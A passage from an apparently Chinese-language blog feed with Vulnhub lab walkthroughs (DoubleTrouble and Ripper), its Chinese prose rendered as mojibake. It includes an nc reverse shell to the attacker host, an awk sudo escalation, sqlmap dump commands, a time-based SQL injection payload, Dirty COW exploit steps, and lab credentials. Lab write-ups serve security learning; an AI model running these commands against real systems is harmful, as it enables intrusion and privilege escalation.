<p>åœ¨èšå‰‘çš„shellä¸Šè¾“å…¥<code>nc -e /bin/bash 10.0.2.4 3333</code>å°†shellåå¼¹åˆ°kaliã€‚å¯ä»¥å‡çº§ä¸€ä¸‹shellï¼ˆéœ€è¦æ³¨æ„ï¼Œé¶æœºæ²¡æœ‰python3ï¼‰ã€‚</p>
<p>ç„¶åè¾“å…¥<code>sudo -l</code>æŸ¥çœ‹çš„æ—¶å€™ï¼Œå‘ç°äº†å¦‚ä¸‹ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
<p>ç„¶åå»äº†<a href="https://gtfobins.github.io/">GTFOBins</a>å‘ç°äº†å¯ä»¥åˆ©ç”¨è¿™ä¸ªé…ç½®ä¸å½“ä»è€Œææƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
<p>æŸ¥çœ‹<code>/root</code>å‘ç°äº†åˆä¸€å°è™šæ‹Ÿæœºï¼Œå…ˆå°†è¯¥è™šæ‹Ÿæœºä¼ ç»™kaliï¼Œç„¶åé€šè¿‡å…±äº«æ–‡ä»¶å¤¹ä¼ åˆ°ä¸»æœºï¼Œæœ€åå†å¯åŠ¨ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¶æœº: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # ä¼ è¾“å®Œ1såè‡ªåŠ¨æ–­å¼€</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
<h1 id="æ¸—é€ç¬¬äºŒå°é¶æœº">3 æ¸—é€â€”â€”ç¬¬äºŒå°é¶æœº</h1>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°-1">3.1 ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
<p>ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttp</li>
<li>é¶æœºçš„æ“ä½œç³»ç»Ÿä¸ºDebian</li>
<li><strong>Linuxå†…æ ¸ä¸º3.x</strong></li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡get-shell">3.2 è®¿é—®httpæœåŠ¡ã€get shell</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
<p>ä¸è®ºè¾“å…¥ä»€ä¹ˆï¼Œè¿™ä¸ªé¡µé¢éƒ½æ²¡æœ‰ä»»ä½•å›åº”ï¼ˆå°±ç¦»è°±ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯åšäº†ä¸ªç™»å½•ç•Œé¢ï¼Œå¹¶æ²¡æœ‰ç™»å½•è¿™ä¸ªåŠŸèƒ½ï¼‰</p>
<p>è·¯å¾„æ‰«æä¹Ÿæ²¡æœ‰å…¶ä»–ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
<p>å› æ­¤ï¼Œæ¼æ´åªå¯èƒ½å‡ºç°åœ¨ç™»å½•ç•Œé¢ï¼Œä½†æ˜¯ä¸è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡æœ‰ä»»ä½•ååº”ã€‚ä½¿ç”¨sqlmapï¼Œå¯ä»¥å‘ç°æ¼æ´ï¼Œå› æ­¤ç›´æ¥ç”¨sqlmapæ‰«ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">username</th>
<th style="text-align: center;">password</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">montreux</td>
<td style="text-align: center;">GfsZxc1</td>
</tr>
<tr class="even">
<td style="text-align: center;">clapton</td>
<td style="text-align: center;">ZubZub99</td>
</tr>
</tbody>
</table>
<p>ç„¶åå»ç™»é™†ç•Œé¢ç™»å½•ï¼Œå‘ç°ä¸¤ä¸ªéƒ½ç™»å½•ä¸ä¸Šã€‚é¦–å…ˆè¿™ä¸å¤ªå¯èƒ½æ˜¯é”™è¯¯çš„æ¶ˆæ¯ï¼Œé‚£ä¹ˆåªæœ‰ä¸€ç§å¯èƒ½ï¼Œé‚£å°±æ˜¯å¹¶ä¸æ˜¯ç™»å½•ç•Œé¢çš„ç”¨æˆ·åå’Œå¯†ç ã€‚åœ¨ç«¯å£æ‰«æä¸­å‘ç°äº†22ç«¯å£æœ‰ç€sshæœåŠ¡ï¼Œå› æ­¤å°è¯•è¿æ¥ï¼Œå‘ç°ç¬¬äºŒä¸ªç”¨æˆ·å’Œå¯†ç å¯ä»¥è¿æ¥çš„ä¸Šã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
<h2 id="æƒé™æå‡-1">3.3 æƒé™æå‡</h2>
<p>é¦–å…ˆæŸ¥çœ‹äº†sudoé…ç½®ï¼Œå‘ç°è¯¥é¶æœºéƒ½æ²¡æœ‰sudoå‘½ä»¤ã€‚suidæƒé™ä¹Ÿæ²¡æœ‰è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä½†æ˜¯æŸ¥çœ‹å†…æ ¸æ—¶å‘ç°ï¼Œè¯¥é¶æœºçš„Linuxå†…æ ¸æ¯”è¾ƒçš„è€</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
<p>å› æ­¤ï¼Œå¯èƒ½å­˜åœ¨å†…æ ¸æ¼æ´ï¼Œè¿™é‡Œä»‹ç»è„ç‰›æ¼æ´<a href="https://github.com/FireFart/dirtycow">dirty</a></p>
<blockquote>
<p>è¯¥æ¼æ´åˆ©ç”¨dirtycowæ¼æ´çš„pokemonæ¼æ´åˆ©ç”¨ä½œä¸ºåŸºç¡€ï¼Œè‡ªåŠ¨ç”Ÿæˆæ–°çš„passwdè¡Œã€‚è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå°†æç¤ºç”¨æˆ·è¾“å…¥æ–°å¯†ç ã€‚ç„¶åå°†åŸå§‹ /etc/passwd æ–‡ä»¶å¤‡ä»½åˆ° /tmp/passwd.bak å¹¶ç”¨ç”Ÿæˆçš„è¡Œè¦†ç›– root å¸æˆ·ã€‚è¿è¡Œæ¼æ´åˆ©ç”¨åï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿä½¿ç”¨æ–°åˆ›å»ºçš„ç”¨æˆ·ç™»å½•ã€‚</p>
</blockquote>
<p>å°†expæ”¾åˆ°é¶æœºä¸Šï¼Œç„¶åç¼–è¯‘æ‰§è¡Œå³å¯ï¼Œæ³¨æ„è¦è¿›å…¥å¯è¯»å¯å†™çš„ç›®å½•ï¼Œæ¯”å¦‚<code>/tmp</code>ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åéœ€è¦è¾“å…¥æ–°çš„å¯†ç ã€‚è¯¥æ¼æ´ä¼šåˆ›å»ºä¸€ä¸ªåä¸º<code>firefart</code>çš„ç”¨æˆ·ï¼Œä½†æ˜¯æ‹¥æœ‰rootæƒé™</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
<hr />
<p>è„ç‰›ææƒåï¼Œåˆ©ç”¨ä¸‹è¿°å‘½ä»¤æ¢å¤åŸæ¥çš„<code>/etc/passwd</code>ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
<hr />
<p>æ¥ä¸‹æ¥æŸ¥çœ‹ä¸¤ä¸ªflagï¼Œç¬¬ä¸€ä¸ªåœ¨<code>/root/root.txt</code>ï¼Œç¬¬äºŒä¸ªåœ¨<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
<p>é¶æœºåˆ°æ­¤ç»“æŸï¼</p>
<h1 id="æ€»ç»“">4 æ€»ç»“</h1>
<p>è¯¥é¶æœºçš„éš¾åº¦ç¡®å®ä¸ç®—éš¾ï¼Œä¸è¿‡è¿˜æ˜¯å­˜åœ¨ç€å‡ ä¸ªéš¾ç‚¹ï¼š</p>
<ul>
<li>ç¬¬ä¸€å°é¶æœºçš„éšå†™æœ¯å¯†ç çˆ†ç ´</li>
<li>ç¬¬äºŒå°é¶æœºçš„æ—¶é—´ç›²æ³¨çš„<strong>å‘ç°</strong></li>
</ul>
<p>æˆ‘æ„Ÿè§‰ç¬¬äºŒå°é¶æœºåªæ˜¯åšäº†ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¸¦å…¥MySQLè¿›è¡ŒæŸ¥è¯¢ï¼Œä¸è®ºç»“æœå¯¹é”™ï¼Œä¹Ÿä¸è®ºæ˜¯å¦æœ‰è¯­æ³•é”™è¯¯ï¼Œéƒ½æ²¡æœ‰ä»»ä½•æç¤ºã€‚ç°å®æƒ…å†µä¸‹æ€»ä¼šæœ‰ä¸åŒçš„æç¤ºçš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸€ä¸ªéš¾ç‚¹ã€‚</p>
<h2 id="sqlæ³¨å…¥æ—¶é—´ç›²æ³¨">4.1 SQLæ³¨å…¥â€”â€”æ—¶é—´ç›²æ³¨</h2>
<p>å¦‚æœåå°è¯­å¥ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆåªéœ€è¦<code>uname=1'and sleep(5)#&amp;psw=1</code>å³å¯ï¼Œæ­¤æ—¶ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯è¯¥é¶æœºä¸è¡Œï¼Œæ­¤æ—¶å°æŠ€å·§ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š</p>
<p>æ­¤æ—¶ï¼Œä¸è®ºåå°è¯­å¥å¦‚ä½•ï¼Œè‡³å°‘å­˜åœ¨ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆå…ˆæŸ¥è¯¢<code>select (sleep(3))</code>ï¼Œç›´æ¥è§¦å‘ï¼Œç„¶åå°†è¿”å›çš„ç»“æœèµ·ä¸ªåˆ«å<code>alia</code>ï¼Œæœ€åæ‰§è¡Œ<code>select x from alia</code>ï¼Œå› ä¸º<code>alia</code>ä¸­å¿…å®šä¸å­˜åœ¨<code>x</code>ï¼Œæ‰€ä»¥æ²¡æœ‰è¿”å›ç»“æœï¼Œå› æ­¤æœ€ç»ˆå‘ˆç°çš„æ•ˆæœå°±æ˜¯é¡µé¢è¿”å›çš„æ—¶é—´è¢«å»¶è¿Ÿäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>éšå†™æœ¯</tag>
        <tag>å¼€æºCMSæ¼æ´åˆ©ç”¨</tag>
        <tag>GTFObinsææƒ</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>è„ç‰›ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>15 Vulnhub Ripper Writeup</title>
    <url>/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºä¸­ã€ä½ï¼Œæ¶‰åŠåˆ°äº†ripsè¿™ä¸ªä¹‹å‰æ²¡æœ‰äº†è§£è¿‡çš„å·¥å…·ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">1. é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ripper-1,706/">Ripper: 1 ~ VulnHub</a></li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ä½ -&gt; ä¸­</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å–å¾—rootæƒé™</li>
<li>æ‹¿åˆ°2ä¸ªflag</li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li><strong>Webä¿¡æ¯æœç´¢</strong></li>
<li><strong>å†…éƒ¨ç³»ç»Ÿæ³„éœ²</strong></li>
<li>ä»£ç å®¡è®¡</li>
<li><strong>å¤‡ä»½æ–‡ä»¶æ³„å¯†</strong></li>
<li>Webminæ¼æ´åˆ©ç”¨</li>
<li>Metasploit</li>
<li>CVE-2021-3493(ä¸“é—¨é’ˆå¯¹Ubuntu)</li>
</ul>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<ul>
<li><a href="http://rips-scanner.sourceforge.net/">RIPS - free PHP security scanner using static code analysis</a></li>
<li><a href="https://github.com/briskets/CVE-2021-3493">GitHub - briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc</a></li>
<li><a href="https://san3ncrypt3d.com/2021/06/20/ripper/">Ripper VulnHub Walkthrough â€“ San3ncrypt3d â€“ Making cybersecurity a habit &amp; Privacy a Goal</a></li>
<li><a href="https://www.yiibai.com/linux/find.html">findå‘½ä»¤ - Linuxå‘½ä»¤å¤§å…¨æ•™ç¨‹â„¢</a></li>
</ul>
<h1 id="æ¸—é€">2. æ¸—é€</h1>
<p>kali: 10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">2.1. ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.23</span><br><span class="line">sudo nmap -p22,80,10000 -sV 10.0.2.23</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png" /></p>
<p>æ”¶é›†ä¿¡æ¯ï¼š</p>
<ul>
<li>22ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯ssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œç‰ˆæœ¬ä¸ºApache2.4.29</li>
<li>10000ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œç‰ˆæœ¬ä¸ºwebmin 1.910</li>
</ul>
<p>è¿™é‡Œï¼Œæˆ‘ç™¾åº¦äº†ä¸€ä¸‹webmin 1.910ï¼Œå‘ç°webminæ˜¯ä¸€ä¸ªå¼€æºçš„webåº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”ç‰ˆæœ¬&lt;=1.910çš„å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸è¿‡éœ€è¦çŸ¥é“ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<h2 id="è®¿é—®httpæœåŠ¡">2.2. è®¿é—®httpæœåŠ¡</h2>
<p>é¦–å…ˆæŸ¥çœ‹äº†ä»¥ä¸‹80ç«¯å£ï¼Œå‘ç°å°±æ˜¯Apacheçš„ä¸€ä¸ªå®‰è£…å¥½ä¹‹åçš„ç•Œé¢ï¼Œå¹¶æ²¡æœ‰æ›´å¤šçš„ä¿¡æ¯ã€‚æ¥ç€åˆè®¿é—®äº†10000ç«¯å£ï¼Œæç¤ºéœ€è¦ç”¨SSLæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯httpsè®¿é—®</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153310.png" /></p>
<p>è¿›å…¥ä¹‹åï¼Œå¾—åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153331.png" /></p>
<p>å°è¯•ä½¿ç”¨é»˜è®¤è´¦å· admin/admin ç™»å½•ï¼Œå‘ç°æ²¡æœ‰æ•ˆæœã€‚åˆå°è¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œå‘ç°ä¹Ÿæ²¡æœ‰ä»»ä½•æ•ˆæœã€‚</p>
<p>å…ˆæŸ¥çœ‹ä»¥ä¸‹80ç«¯å£çš„robots.txtï¼Œå‘ç°80ç«¯å£ä¸å­˜åœ¨è¯¥æ–‡ä»¶ã€‚æŸ¥çœ‹10000ç«¯å£çš„è¯¥æ–‡ä»¶ï¼Œå‘ç°äº†ä¸€ä¸ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153627.png" /></p>
<p>å°†å…¶base64è§£ç å¾—åˆ°ä¸€å¥è¯ï¼š<strong>we scan php codes with rips</strong></p>
<p>ç„¶åç™¾åº¦ä»€ä¹ˆæ˜¯ripsï¼Œå‘ç°è¿™æ˜¯ä¸€æ¬¾é™æ€çš„phpçš„ä»£ç å®¡è®¡æ”»å‡»ï¼ˆå®˜ç½‘åœ¨[[#é¶æœºä¿¡æ¯]]ç»™å‡ºï¼‰ï¼Œé»˜è®¤çš„æ‰“å¼€æ–¹å¼ä¸º <code>http://localhost/rips</code>ï¼Œäºæ˜¯ä¾æ¬¡å°è¯•åœ¨80ç«¯å£å’Œ10000ç«¯å£è®¿é—®ï¼Œæœ€ç»ˆ80ç«¯å£ä¸ŠæˆåŠŸå‡ºç°äº†è¯¥å·¥å…·çš„é¡µé¢ã€‚</p>
<blockquote>
<p>ç½‘ä¸Šæœ‰äººä½¿ç”¨dirbusterçˆ†ç ´å‡ºripsç›®å½•ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153904.png" /></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>å…ˆæ‰«æ/var/wwwè¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¾ˆå¿«å°±å¾—åˆ°äº†ç»“æœ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154139.png" /></p>
<p>å‘ç°ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°è®¸å¤šphpæ–‡ä»¶çš„æºç ï¼Œå¹¶ä¸”ç»™å‡ºäº†å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚å°è¯•åˆ©ç”¨ä¸€ä¸‹<code>/var/www/html/rips/windows/code.php</code>çš„æ–‡ä»¶æš´éœ²æ¼æ´ã€‚ä½†æ˜¯è¿™ä¸ªæ¼æ´ä¸èƒ½è¯»å–ä¸åŒç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œåªèƒ½å¤Ÿè¯»å–åŒç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè€Œä¸”åªæ˜¯ç®€å•çš„æŠŠæ–‡ä»¶å†…å®¹æš´éœ²å‡ºæ¥ï¼Œå¹¶ä¸ä¼šæŠŠä»£ç æ‰§è¡Œã€‚å› æ­¤ï¼Œç›®å‰æ²¡æœ‰åˆ©ç”¨ä»·å€¼ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154541.png" /></p>
<p>å†æ¬¡å›åˆ°ripsç•Œé¢ï¼Œå¯ä»¥åˆ©ç”¨/regex/æœç´¢åŒ…å«æŸäº›å…³é”®è¯çš„phpæ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154521.png" /></p>
<p>å‘ç°äº†ä¸€ä¸ª<code>secret.php</code>æ–‡ä»¶ï¼Œè¿™åå­—ä¸€çœ‹å°±éšè—ç€å¯†ç ã€‚</p>
<p>å…¶å®ä¹Ÿå¯ä»¥åŒé€šè¿‡ä¸‹å›¾ä¸­çš„fileåŠŸèƒ½åˆ—å‡ºæ‰«æçš„æ‰€æœ‰phpæ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154708.png" /></p>
<p>è¯¥æ–‡ä»¶ä¸­çš„ä¿¡æ¯å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user name: ripper</span><br><span class="line">pass: Gamespeopleplay</span><br></pre></td></tr></table></figure></p>
<p>èµ·åˆè¿˜ä»¥ä¸ºè¿™æ˜¯10000ç«¯å£çš„ç™»å½•è´¦å·å’Œå¯†ç ï¼Œä½†æ˜¯å°è¯•è¿‡åå‘ç°å¹¶ä¸æ˜¯ã€‚å› æ­¤ç›®å‰åªæœ‰sshéœ€è¦å¯†ç ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155132.png" /></p>
<h2 id="æƒé™æå‡">2.4. æƒé™æå‡</h2>
<h3 id="è·å¾—cubesæƒé™">2.4.1. è·å¾—cubesæƒé™</h3>
<p>å‘ç°/homeç›®å½•ä¸‹é™¤äº†ripperä¹‹å¤–ï¼Œå­˜åœ¨ç€å¦ä¸€ä¸ªç”¨æˆ·cubesã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å¯èƒ½å°±æ˜¯éœ€è¦å…ˆæ‹¿åˆ°cubesçš„æƒé™ï¼Œç„¶åå†æ‹¿åˆ°rootæƒé™ã€‚</p>
<p>ç»è¿‡ä¿¡æ¯æ”¶é›†å‘ç°ä¹‹å‰çš„ä¸€äº›ææƒæ‰‹æ®µéƒ½æ²¡æ³•ä½¿ç”¨ã€‚æ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ‰¾åˆ°å±ä¸»æ˜¯cubesä½†æ˜¯ripperå¯è¯»çš„æ–‡ä»¶ã€‚ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155612.png" /></p>
<p>åˆå‘ç°äº†ä¸€ä¸ªsecret.fileæ–‡ä»¶ï¼Œç›´æ¥æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is my secret file</span><br><span class="line"></span><br><span class="line">[file system]</span><br><span class="line">-passwd : Il00tpeople</span><br></pre></td></tr></table></figure></p>
<p>åˆå¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå› ä¸ºå±ä¸»æ˜¯cubesï¼Œå¯èƒ½è¿™å°±æ˜¯cubesç”¨æˆ·çš„sshç™»å½•å¯†ç ï¼Œç›´æ¥å°è¯•</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155811.png" /></p>
<p>æˆåŠŸè·å¾—cubesæƒé™ã€‚</p>
<h3 id="è·å¾—rootæƒé™">2.4.2. è·å¾—rootæƒé™</h3>
<h4 id="æ–¹æ³•1">2.4.2.1. æ–¹æ³•1</h4>
<p>æ¥ä¸‹æ¥åŒæ ·ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°ä¹‹å‰çš„æ‰‹æ®µè¿˜æ˜¯æ— æ³•åˆ©ç”¨ã€‚å› æ­¤å†æ¬¡è¾“å…¥ä¸Šè¿°å‘½ä»¤ï¼ˆç¨ä½œä¿®æ”¹ï¼‰ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null|grep -v <span class="string">&quot;proc&quot;</span>|grep -v <span class="string">&quot;.png&quot;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160020.png" /></p>
<p>ç»è¿‡å¯¹æ–‡ä»¶çš„æŸ¥çœ‹ï¼Œå‘ç° miniser.logï¼Œæˆ‘ä»¬çŸ¥é“10000ç«¯å£ä¸Šçš„æœåŠ¡æ­£å¥½å°±æ˜¯miniservï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶ä¿å­˜çš„åº”è¯¥å°±æ˜¯ç›¸å…³çš„æ—¥å¿—ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œå‘ç°äº†ä¸€æ¡é‡è¦çš„ä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authentication : session_login.cgi=username=admin&amp;pass=tokiohotel</span><br></pre></td></tr></table></figure></p>
<p>è¿™åº”è¯¥å°±æ˜¯10000ç«¯å£çš„ç™»å½•ç•Œé¢çš„è´¦å·å¯†ç äº†ã€‚æˆåŠŸç™»å½•åˆ°åå°åæ‰¾åˆ°<code>others -&gt; command shell</code>èƒ½å¤Ÿç›´æ¥è·å¾—ä¸€ä¸ªshellï¼ŒæƒŠè®¶çš„å‘ç°è¿™å±…ç„¶æ˜¯rootæƒé™ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160511.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160527.png" /></p>
<p>æ­¤æ—¶å¯ä»¥ç›´æ¥è¯»å–flagã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/ripper/flag.txt</span><br><span class="line">__________.____________________________________________ </span><br><span class="line">\______   \   \______   \______   \_   _____/\______   \</span><br><span class="line"> |       _/   ||     ___/|     ___/|    __)_  |       _/</span><br><span class="line"> |    |   \   ||    |    |    |    |        \ |    |   \</span><br><span class="line"> |____|_  /___||____|    |____|   /_______  / |____|_  /</span><br><span class="line">        \/                                \/         \/ </span><br><span class="line"></span><br><span class="line">flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;</span><br><span class="line"></span><br><span class="line">C0ngratulation on getting user ! Lets get root now :)</span><br><span class="line"></span><br><span class="line">// 2. /root/flag.txt</span><br><span class="line">.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. </span><br><span class="line">| |-&#x27;| | | || .` || \ \### | |-&lt; | || |-&#x27;| |-&#x27;| |- | |-&lt; </span><br><span class="line">`-&#x27;  `-----&#x27;`-&#x27;`-&#x27;`-&#x27;-&#x27;    `-&#x27;`-&#x27;`-&#x27;`-&#x27;  `-&#x27;  `---&#x27;`-&#x27;`-&#x27;</span><br><span class="line"></span><br><span class="line">COngrats !!! You have rooted this box !!</span><br><span class="line"></span><br><span class="line">Follow me on twitter @san3ncrypt3d</span><br></pre></td></tr></table></figure></p>
<h4 id="æ–¹æ³•2">2.4.2.2. æ–¹æ³•2</h4>
<p>ç™»å½•åå°ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨ä¹‹å‰æåˆ°çš„è¿œç¨‹æ‰§è¡Œæ¼æ´è·å¾—rootæƒé™ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161007.png" /></p>
